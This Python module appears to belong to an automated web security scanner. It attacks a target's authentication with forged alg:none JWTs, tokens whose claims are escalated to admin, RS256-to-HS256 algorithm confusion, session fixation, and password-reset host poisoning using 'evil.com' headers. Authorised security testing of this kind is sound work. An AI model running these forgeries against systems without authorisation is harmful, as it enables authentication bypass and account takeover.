"""Skill: test_auth_deep — JWT attacks, session fixation, token analysis."""

from __future__ import annotations
import asyncio
import base64
import json
import logging
from typing import Any
from ._payload_loader import load_skill_dataset as _load_ds

logger = logging.getLogger(__name__)

JWT_ALG_NONE_HEADERS = _load_ds(
    "test_auth_deep", "jwt_alg_none_headers"
)  # ADR-007 Phase 3-9 — data in data/payloads/test_auth_deep.json

RESET_PATHS = _load_ds(
    "test_auth_deep", "reset_paths"
)  # ADR-007 Phase 3-9 — data in data/payloads/test_auth_deep.json


def _b64_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64_decode(s: str) -> bytes:
    pad = 4 - len(s) % 4
    return base64.urlsafe_b64decode(s + "=" * pad)


def _reset_response_is_poisoned(body: str) -> bool:
    """Return True only when the attacker-controlled host is reflected in the body.

    A generic "Password reset email sent" response contains the word "reset" but
    is NOT evidence the poisoned Host header was honored — matching on "reset"
    produced false-positive password_reset_poisoning findings on every reset
    endpoint that returns a 200. The real signal is the attacker host (evil.com)
    appearing in the response (e.g. inside the reset link).
    """
    return "evil.com" in str(body or "").lower()


def _forge_alg_none(token: str, new_header: dict[str, str]) -> str:
    """Create a forged JWT with alg:none."""
    parts = token.split(".")
    if len(parts) < 2:
        return ""
    payload_part = parts[1]
    header_b64 = _jwt_json_part(new_header)
    return f"{header_b64}.{payload_part}."


def _jwt_json_part(data: dict[str, Any]) -> str:
    return _b64_encode(json.dumps(data, separators=(",", ":"), sort_keys=True).encode())


def _decode_jwt_json(part: str) -> dict[str, Any]:
    try:
        decoded = json.loads(_b64_decode(part))
    except Exception:
        return {}
    return decoded if isinstance(decoded, dict) else {}


def _forge_unsecured_jwt(header: dict[str, Any], payload: dict[str, Any]) -> str:
    alg_none = dict(header)
    alg_none["alg"] = "none"
    return f"{_jwt_json_part(alg_none)}.{_jwt_json_part(payload)}."


def _claim_tamper_variants(payload: dict[str, Any]) -> list[tuple[str, dict[str, Any]]]:
    variants: list[tuple[str, dict[str, Any]]] = []

    def add(label: str, updates: dict[str, Any]) -> None:
        tampered = dict(payload)
        tampered.update(updates)
        if tampered != payload:
            variants.append((label, tampered))

    if "role" in payload:
        add("role=admin", {"role": "admin"})
    if "roles" in payload:
        roles = payload.get("roles")
        if isinstance(roles, list):
            add("roles+=admin", {"roles": sorted({*map(str, roles), "admin"})})
        elif isinstance(roles, str):
            add("roles=admin", {"roles": "admin"})
    if "scope" in payload:
        scope = str(payload.get("scope") or "")
        add("scope+=admin", {"scope": " ".join(part for part in (scope, "admin") if part).strip()})
    if "scopes" in payload:
        scopes = payload.get("scopes")
        if isinstance(scopes, list):
            add("scopes+=admin", {"scopes": sorted({*map(str, scopes), "admin"})})
    for flag in ("admin", "is_admin"):
        if flag in payload:
            add(f"{flag}=true", {flag: True})
    if "permissions" in payload:
        perms = payload.get("permissions")
        if isinstance(perms, list):
            add("permissions+=admin", {"permissions": sorted({*map(str, perms), "admin"})})
        elif isinstance(perms, str):
            add("permissions=admin", {"permissions": "admin"})
    if not variants and payload:
        add("role=admin", {"role": "admin"})

    return variants[:6]


def _claim_snapshot(payload: dict[str, Any]) -> dict[str, Any]:
    keys = ("role", "roles", "scope", "scopes", "admin", "is_admin", "permissions")
    return {key: payload[key] for key in keys if key in payload}


def _privileged_claim_response(baseline: dict[str, Any], status: int, body: str) -> bool:
    if status != 200:
        return False
    baseline_status = baseline.get("status") if baseline else None
    if baseline_status is None:
        return False
    if baseline_status != 200:
        return True
    lower = str(body or "").lower()
    privileged_markers = ("admin", "role", "scope", "permission", "superuser")
    if any(marker in lower for marker in privileged_markers):
        return str(baseline.get("preview", "")).lower() != lower[:240]
    return False


async def execute(target_url: str, token: str | None = None, **kwargs: Any) -> dict[str, Any]:
    """Deep authentication testing: JWT confusion, session fixation, reset poisoning.

    Returns:
        {
            "vulnerable": bool,
            "findings": [...],
            "control_evidence": {"baseline": {...}, "interesting_responses": [...]},
            "tested": int,
        }
    """
    from vxis.interaction.hands import SessionManager

    target = target_url.rstrip("/")
    findings: list[dict[str, Any]] = []
    control_evidence: list[dict[str, Any]] = []
    tested = 0
    sem = asyncio.Semaphore(15)

    _mgr = SessionManager()
    _session = await _mgr.get_session(target)
    baseline_user_me: dict[str, Any] = {}

    if token:
        try:
            base_me = await _session.request(
                "GET",
                f"{target}/api/users/me",
                headers={"Authorization": f"Bearer {token}"},
            )
            baseline_user_me = {
                "status": base_me.status,
                "size": base_me.body_length,
                "preview": base_me.text[:240],
            }
        except Exception:
            baseline_user_me = {}

    # --- JWT alg:none attack ---
    if token and "." in token:
        parts = token.split(".")
        if len(parts) >= 2:
            try:
                decoded_header = _decode_jwt_json(parts[0])
                decoded_payload = _decode_jwt_json(parts[1])
                logger.info("JWT header: %s", decoded_header)
            except Exception:
                decoded_header = {}
                decoded_payload = {}

            for alg_header in JWT_ALG_NONE_HEADERS:
                tested += 1
                forged = _forge_alg_none(token, alg_header)
                if not forged:
                    continue
                async with sem:
                    try:
                        r = await _session.request(
                            "GET",
                            f"{target}/api/users/me",
                            headers={"Authorization": f"Bearer {forged}"},
                        )
                        if r.status == 200:
                            findings.append(
                                {
                                    "type": "jwt_alg_none",
                                    "payload": f"alg={alg_header['alg']}",
                                    "evidence": f"Server accepted alg:none token (status {r.status})",
                                    "response_preview": r.text[:300],
                                    "control": {
                                        "baseline_user_me": baseline_user_me,
                                        "forged_status": r.status,
                                        "forged_size": r.body_length,
                                        "forged_preview": r.text[:180],
                                        "header": alg_header,
                                    },
                                    "severity": "critical",
                                }
                            )
                        control_evidence.append(
                            {
                                "type": "jwt_alg_none",
                                "payload": f"alg={alg_header['alg']}",
                                "status": r.status,
                                "size": r.body_length,
                                "preview": r.text[:180],
                            }
                        )
                    except Exception:
                        pass

            for label, tampered_payload in _claim_tamper_variants(decoded_payload):
                for alg_header in JWT_ALG_NONE_HEADERS:
                    tested += 1
                    forged = _forge_unsecured_jwt(alg_header, tampered_payload)
                    async with sem:
                        try:
                            r = await _session.request(
                                "GET",
                                f"{target}/api/users/me",
                                headers={"Authorization": f"Bearer {forged}"},
                            )
                            if _privileged_claim_response(baseline_user_me, r.status, r.text):
                                findings.append(
                                    {
                                        "type": "jwt_claim_tampering",
                                        "payload": label,
                                        "evidence": (
                                            "Server accepted unsigned JWT with privileged claim mutation "
                                            f"(status {r.status})"
                                        ),
                                        "response_preview": r.text[:300],
                                        "control": {
                                            "baseline_user_me": baseline_user_me,
                                            "forged_status": r.status,
                                            "forged_size": r.body_length,
                                            "forged_preview": r.text[:180],
                                            "header": alg_header,
                                            "original_claims": _claim_snapshot(decoded_payload),
                                            "tampered_claims": _claim_snapshot(tampered_payload),
                                        },
                                        "severity": "critical",
                                    }
                                )
                            control_evidence.append(
                                {
                                    "type": "jwt_claim_tampering",
                                    "payload": label,
                                    "status": r.status,
                                    "size": r.body_length,
                                    "preview": r.text[:180],
                                }
                            )
                        except Exception:
                            pass

            # --- RS256 -> HS256 confusion ---
            if decoded_header.get("alg", "").startswith("RS"):
                tested += 1
                confused = dict(decoded_header)
                confused["alg"] = "HS256"
                header_b64 = _jwt_json_part(confused)
                forged_hs = f"{header_b64}.{parts[1]}.fakesig"
                async with sem:
                    try:
                        r = await _session.request(
                            "GET",
                            f"{target}/api/users/me",
                            headers={"Authorization": f"Bearer {forged_hs}"},
                        )
                        if r.status == 200:
                            findings.append(
                                {
                                    "type": "jwt_alg_confusion",
                                    "payload": "RS256->HS256",
                                    "evidence": "Server accepted algorithm-confused token",
                                    "response_preview": r.text[:300],
                                    "control": {
                                        "baseline_user_me": baseline_user_me,
                                        "forged_status": r.status,
                                        "forged_size": r.body_length,
                                        "forged_preview": r.text[:180],
                                        "original_alg": decoded_header.get("alg", ""),
                                    },
                                    "severity": "critical",
                                }
                            )
                        control_evidence.append(
                            {
                                "type": "jwt_alg_confusion",
                                "payload": "RS256->HS256",
                                "status": r.status,
                                "size": r.body_length,
                                "preview": r.text[:180],
                            }
                        )
                    except Exception:
                        pass

    # --- Session fixation ---
    tested += 1
    async with sem:
        try:
            r = await _session.request(
                "GET", "/", headers={"Cookie": "session=attacker_fixed_session"}
            )
            set_cookie = r.headers.get("set-cookie", "")
            if (
                "attacker_fixed_session" in set_cookie
                or "session=attacker_fixed_session" in set_cookie
            ):
                findings.append(
                    {
                        "type": "session_fixation",
                        "payload": "session=attacker_fixed_session",
                        "evidence": "Server accepted attacker-supplied session ID",
                        "response_preview": r.text[:300],
                        "control": {
                            "request_cookie": "session=attacker_fixed_session",
                            "set_cookie": set_cookie[:240],
                            "status": r.status,
                            "preview": r.text[:180],
                        },
                        "severity": "high",
                    }
                )
            control_evidence.append(
                {
                    "type": "session_fixation",
                    "payload": "session=attacker_fixed_session",
                    "status": r.status,
                    "set_cookie": set_cookie[:180],
                    "preview": r.text[:180],
                }
            )
        except Exception:
            pass

    # --- Password reset host poisoning ---
    async def test_reset(path: str) -> None:
        nonlocal tested
        async with sem:
            tested += 1
            try:
                r = await _session.request(
                    "POST",
                    f"{target}{path}",
                    json_data={"email": "test@example.com"},
                    headers={"Host": "evil.com", "X-Forwarded-Host": "evil.com"},
                )
                if r.status in (200, 201, 202):
                    body = r.text.lower()
                    if _reset_response_is_poisoned(body):
                        findings.append(
                            {
                                "type": "password_reset_poisoning",
                                "payload": f"Host: evil.com on {path}",
                                "evidence": f"Reset endpoint responded to poisoned host (status {r.status})",
                                "response_preview": r.text[:300],
                                "control": {
                                    "poisoned_host": "evil.com",
                                    "status": r.status,
                                    "size": r.body_length,
                                    "preview": r.text[:180],
                                    "path": path,
                                },
                                "severity": "high",
                            }
                        )
                    control_evidence.append(
                        {
                            "type": "password_reset_poisoning",
                            "payload": f"Host: evil.com on {path}",
                            "status": r.status,
                            "size": r.body_length,
                            "preview": r.text[:180],
                        }
                    )
            except Exception:
                pass

    await asyncio.gather(*[test_reset(p) for p in RESET_PATHS])

    return {
        "vulnerable": len(findings) > 0,
        "findings": findings,
        "control_evidence": {
            "baseline_user_me": baseline_user_me,
            "interesting_responses": control_evidence[:12],
        },
        "tested": tested,
    }
